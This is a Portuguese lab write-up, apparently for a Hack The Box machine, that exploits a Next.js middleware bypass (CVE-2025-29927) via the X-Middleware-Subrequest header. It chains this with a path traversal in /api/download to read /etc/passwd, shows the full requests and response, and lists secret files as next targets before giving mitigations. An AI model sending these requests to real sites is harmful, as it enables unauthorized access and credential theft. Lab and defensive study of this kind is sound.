---
title: "Previous"
date: 2026-10-10
type: "labs"
difficulty: "Medium"
pwned: false
os: "Linux"
tags: ["linux", "web", "nextjs", "middleware-bypass", "cve-2025-29927", "path-traversal", "lfi", "burp", "next-auth"]
summary: "Linux box com app Next.js. Bypass de middleware (CVE-2025-29927) via header X-Middleware-Subrequest e path traversal no parametro example de /api/download levando a LFI (/etc/passwd)."
machine_info:
  IP: "previous.htb"
  OS: "Linux (Ubuntu)"
  Dificuldade: "Medium"
  CVE: "CVE-2025-29927 (Next.js Middleware Bypass)"
  Portas principais: "22/tcp (SSH), 80/tcp (HTTP)"
  Stack: "Next.js + next-auth (nginx 1.18.0)"
---

## Reconhecimento

```bash
$ nmap -sC -sV previous.htb
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Apenas SSH (22) e HTTP (80) expostos. A aplicação web é um **Next.js** (confirmado pelos artefatos `/_next/data/` e pelos cookies `next-auth.*`).

## Suposição / Superfície

O app usa `next-auth` para autenticação e serve conteúdo protegido por **middleware** do Next.js. A presença de `/_next/data/` e rotas `/docs` sugere áreas restritas por middleware — candidato direto ao **CVE-2025-29927 (Next.js Middleware Bypass)**.

> A ideia: o middleware do Next.js pode ser contornado enviando o header `X-Middleware-Subrequest` com uma cadeia de valores `middleware`, fazendo o framework tratar a requisição como uma subrequisição interna e **pular as checagens de autorização**.

## Exploração — Bypass de Middleware (CVE-2025-29927)

Requisição a uma rota protegida adicionando o header malicioso:

```http
GET /docs/examples HTTP/1.1
Host: previous.htb
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cookie: next-auth.csrf-token=...; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs
Connection: keep-alive
```

Com o header, o acesso à rota `/docs/examples` passa pelo middleware sem a verificação esperada → conteúdo restrito acessível.

## Interceptando o download no Burp

Dentro de `/docs/examples` há uma função de download de exemplos. Capturando a requisição legítima no Burp:

```http
GET /api/download?example=hello-world.ts HTTP/1.1
Host: previous.htb
Referer: http://previous.htb/docs/examples
Cookie: next-auth.csrf-token=...; next-auth.callback-url=...
Connection: keep-alive
```

O parâmetro **`example`** controla qual arquivo é servido → alvo óbvio para **path traversal**.

## Path Traversal → LFI

Abusando do `example` para sair do diretório de exemplos e ler arquivos arbitrários (combinado com o bypass de middleware no header):

```http
GET /api/download?example=../../../etc/passwd HTTP/1.1
Host: previous.htb
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
Referer: http://previous.htb/docs/examples
Cookie: next-auth.csrf-token=...; next-auth.callback-url=...
Connection: keep-alive
```

**Resposta:**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/zip
Content-Length: 787
Content-Disposition: attachment; filename=../../../etc/passwd
ETag: "41amqg1v4m26j"

root:x:0:0:root:/root:/bin/sh
...
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

✅ **LFI confirmada** — leitura arbitrária de arquivos. O `/etc/passwd` revela os usuários locais de interesse: **`node`** (uid 1000, `/home/node`, shell válido) e **`nextjs`** (uid 1001).

## Próximos passos (a partir da LFI)

Com leitura arbitrária de arquivos, os alvos naturais para continuar a cadeia são os segredos da aplicação Next.js / next-auth e configs de ambiente:

- Variáveis/segredos do `next-auth` (ex.: `NEXTAUTH_SECRET`) — ver provedor de credenciais do next-auth.
- Arquivos de ambiente e compose do deploy (padrão Next.js em Docker) — `.env`, `compose.yaml`.
- Chaves/configs que permitam pivotar para SSH como `node`.

## Vulnerabilidades

- **CVE-2025-29927 (Next.js Middleware Bypass)** — header `X-Middleware-Subrequest` contorna checagens de autorização do middleware.
- **Path traversal / LFI** — parâmetro `example` em `/api/download` não sanitiza `../`, permitindo leitura de arquivos arbitrários.

**Mitigações:** atualizar o Next.js para versão corrigida; ignorar/filtrar o header `X-Middleware-Subrequest` na borda (nginx); validar e normalizar o parâmetro `example` (whitelist de arquivos / resolver caminho e confinar ao diretório de exemplos).

## Referências

- next-auth — Credentials provider: https://next-auth.js.org/providers/credentials
- Next.js — exemplo docker multi-env (compose): https://github.com/vercel/next.js/blob/canary/examples/with-docker-multi-env/docker/production/compose.yaml
